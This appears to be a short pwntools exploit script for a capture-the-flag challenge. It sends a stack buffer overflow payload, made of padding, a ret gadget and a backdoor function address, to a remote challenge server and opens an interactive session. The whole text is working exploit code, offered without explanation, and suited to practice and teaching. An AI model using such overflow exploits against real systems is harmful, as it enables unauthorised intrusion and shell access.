from pwn import *

s = remote('pwn-2021.duc.tf', 31921)

outBackdoor = 0x4011d7
ret = 0x401016

payload = b'A' * 24 + p64(ret) + p64(outBackdoor)

s.sendline(payload)

s.interactive()
